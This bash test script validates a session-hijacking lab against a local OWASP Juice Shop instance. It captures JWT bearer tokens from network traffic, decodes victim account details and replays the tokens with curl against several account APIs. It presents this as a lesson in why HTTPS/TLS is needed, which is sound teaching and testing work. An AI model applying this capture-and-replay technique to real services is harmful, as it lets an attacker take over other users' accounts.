#!/bin/bash
# Session Hijacking Validation Test
# Tests that session hijacking captures and replays tokens correctly

set -euo pipefail

echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║     SESSION HIJACKING VALIDATION TEST                            ║"
echo "║     Verifies real-time capture and token replay                  ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

PASSED=0
FAILED=0

test_passed() {
    echo -e "${GREEN}✓${NC} $1"
    PASSED=$((PASSED + 1))
}

test_failed() {
    echo -e "${RED}✗${NC} $1"
    FAILED=$((FAILED + 1))
}

test_warning() {
    echo -e "${YELLOW}⚠${NC} $1"
}

echo "Step 1: Check if Juice Shop is running"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:3003/ || echo "000")
if [ "$HTTP_CODE" = "200" ]; then
    test_passed "Juice Shop is running (HTTP $HTTP_CODE)"
else
    test_failed "Juice Shop is not running (HTTP $HTTP_CODE)"
    echo ""
    echo "Please start Juice Shop first:"
    echo "  ./start-juiceshop.sh"
    exit 1
fi
echo ""

echo "Step 2: Run session hijacking attack"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
cd /workspaces/cns/backend
OUTPUT=$(sudo bash scripts/session-hijack.sh 127.0.0.1 2>&1)

# Check if tokens were captured
TOKEN_COUNT=$(echo "$OUTPUT" | grep "total_tokens:" | awk '{print $2}')
if [ ! -z "$TOKEN_COUNT" ] && [ "$TOKEN_COUNT" -gt 0 ]; then
    test_passed "Captured $TOKEN_COUNT JWT tokens"
else
    test_failed "No tokens captured"
    echo "$OUTPUT" | tail -20
    exit 1
fi

# Check if vulnerabilities were found
VULN_COUNT=$(echo "$OUTPUT" | grep "total_vulnerabilities:" | awk '{print $2}')
if [ ! -z "$VULN_COUNT" ] && [ "$VULN_COUNT" -gt 0 ]; then
    test_passed "Detected $VULN_COUNT vulnerabilities"
else
    test_warning "No vulnerabilities detected"
fi

# Check if PCAP file was created
LATEST_PCAP=$(ls -t /workspaces/cns/artifacts/session-hijack-127.0.0.1-*.pcap 2>/dev/null | head -1)
if [ ! -z "$LATEST_PCAP" ] && [ -f "$LATEST_PCAP" ]; then
    PCAP_SIZE=$(stat -f%z "$LATEST_PCAP" 2>/dev/null || stat -c%s "$LATEST_PCAP" 2>/dev/null)
    if [ "$PCAP_SIZE" -gt 1000 ]; then
        test_passed "PCAP file created (${PCAP_SIZE} bytes)"
    else
        test_warning "PCAP file is very small (${PCAP_SIZE} bytes)"
    fi
else
    test_failed "PCAP file not created"
fi
echo ""

echo "Step 3: Extract and validate captured token"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
cd /workspaces/cns
LATEST_TOKEN_FILE=$(ls -t artifacts/session-tokens-127.0.0.1-*.txt 2>/dev/null | head -1)

if [ -z "$LATEST_TOKEN_FILE" ] || [ ! -f "$LATEST_TOKEN_FILE" ]; then
    test_failed "Token file not found"
    exit 1
fi

TOKEN=$(cat "$LATEST_TOKEN_FILE" | grep "Bearer" | head -1 | sed 's/Authorization Header: Bearer //' | xargs)

if [ -z "$TOKEN" ]; then
    test_failed "No token found in file"
    exit 1
fi

if [ ${#TOKEN} -lt 100 ]; then
    test_failed "Token is too short (${#TOKEN} chars)"
    exit 1
else
    test_passed "Token extracted (${#TOKEN} chars)"
fi

# Validate JWT format
if [[ "$TOKEN" =~ ^eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$ ]]; then
    test_passed "Token has valid JWT format"
else
    test_failed "Token does not match JWT format"
fi

# Decode and validate JWT payload
JWT_PAYLOAD=$(echo "$TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null)
if echo "$JWT_PAYLOAD" | jq -e '.data.email' > /dev/null 2>&1; then
    VICTIM_EMAIL=$(echo "$JWT_PAYLOAD" | jq -r '.data.email')
    VICTIM_ID=$(echo "$JWT_PAYLOAD" | jq -r '.data.id')
    VICTIM_ROLE=$(echo "$JWT_PAYLOAD" | jq -r '.data.role')
    test_passed "JWT contains victim data (email: $VICTIM_EMAIL, id: $VICTIM_ID)"
else
    test_failed "JWT payload is invalid or malformed"
fi
echo ""

echo "Step 4: Test token replay (session hijacking)"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# Test 1: Access Challenges API
CHALLENGES_RESPONSE=$(curl -s -H "Authorization: Bearer $TOKEN" http://127.0.0.1:3003/api/Challenges)
CHALLENGES_STATUS=$(echo "$CHALLENGES_RESPONSE" | jq -r '.status' 2>/dev/null || echo "error")

if [ "$CHALLENGES_STATUS" = "success" ]; then
    CHALLENGE_COUNT=$(echo "$CHALLENGES_RESPONSE" | jq '.data | length' 2>/dev/null)
    test_passed "Hijacked token accesses Challenges API ($CHALLENGE_COUNT challenges)"
else
    test_failed "Challenges API rejected token (status: $CHALLENGES_STATUS)"
fi

# Test 2: Access User Basket
BASKET_RESPONSE=$(curl -s -H "Authorization: Bearer $TOKEN" http://127.0.0.1:3003/rest/basket/1)
BASKET_STATUS=$(echo "$BASKET_RESPONSE" | jq -r '.status' 2>/dev/null || echo "error")

if [ "$BASKET_STATUS" = "success" ]; then
    PRODUCT_COUNT=$(echo "$BASKET_RESPONSE" | jq '.data.Products | length' 2>/dev/null || echo "0")
    test_passed "Hijacked token accesses victim's basket ($PRODUCT_COUNT products)"
else
    test_failed "Basket API rejected token (status: $BASKET_STATUS)"
fi

# Test 3: Access Quantities API
QUANTITIES_RESPONSE=$(curl -s -H "Authorization: Bearer $TOKEN" http://127.0.0.1:3003/api/Quantitys)
QUANTITIES_STATUS=$(echo "$QUANTITIES_RESPONSE" | jq -r '.status' 2>/dev/null || echo "error")

if [ "$QUANTITIES_STATUS" = "success" ]; then
    test_passed "Hijacked token accesses Quantities API"
else
    test_failed "Quantities API rejected token (status: $QUANTITIES_STATUS)"
fi

echo ""
echo "Step 5: Verify packet capture contains real traffic"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

if [ ! -z "$LATEST_PCAP" ] && [ -f "$LATEST_PCAP" ]; then
    PACKET_COUNT=$(sudo tcpdump -r "$LATEST_PCAP" 2>/dev/null | wc -l || echo "0")
    if [ "$PACKET_COUNT" -gt 50 ]; then
        test_passed "PCAP contains $PACKET_COUNT packets"
    else
        test_warning "PCAP has few packets ($PACKET_COUNT)"
    fi
    
    # Check for HTTP POST requests
    HTTP_POST_COUNT=$(sudo tcpdump -r "$LATEST_PCAP" -A 2>/dev/null | grep -c "POST /rest/user/login" || echo "0")
    if [ "$HTTP_POST_COUNT" -gt 0 ]; then
        test_passed "PCAP contains $HTTP_POST_COUNT login attempts"
    else
        test_warning "No login attempts found in PCAP"
    fi
    
    # Check for JWT tokens in packets
    JWT_IN_PCAP=$(sudo tcpdump -r "$LATEST_PCAP" -A 2>/dev/null | grep -c "eyJ0eXAiOiJKV1Qi" || echo "0")
    if [ "$JWT_IN_PCAP" -gt 0 ]; then
        test_passed "PCAP contains $JWT_IN_PCAP JWT tokens"
    else
        test_failed "No JWT tokens found in PCAP"
    fi
fi

echo ""
echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║                      VALIDATION RESULTS                          ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""
echo -e "${GREEN}Tests Passed: $PASSED${NC}"
if [ $FAILED -gt 0 ]; then
    echo -e "${RED}Tests Failed: $FAILED${NC}"
fi
echo ""

if [ $FAILED -eq 0 ]; then
    echo "╔══════════════════════════════════════════════════════════════════╗"
    echo "║                  ✓ ALL TESTS PASSED                             ║"
    echo "╚══════════════════════════════════════════════════════════════════╝"
    echo ""
    echo "✅ Session hijacking is working correctly!"
    echo "✅ Real packets captured from network interface"
    echo "✅ JWT tokens extracted from HTTP traffic"
    echo "✅ Tokens can be replayed to hijack sessions"
    echo "✅ Attacker gains full access to victim's account"
    echo ""
    echo "🎓 This demonstrates why HTTPS/TLS is mandatory!"
    echo ""
    exit 0
else
    echo "╔══════════════════════════════════════════════════════════════════╗"
    echo "║                  ✗ SOME TESTS FAILED                            ║"
    echo "╚══════════════════════════════════════════════════════════════════╝"
    echo ""
    echo "Please check the errors above and try again."
    exit 1
fi
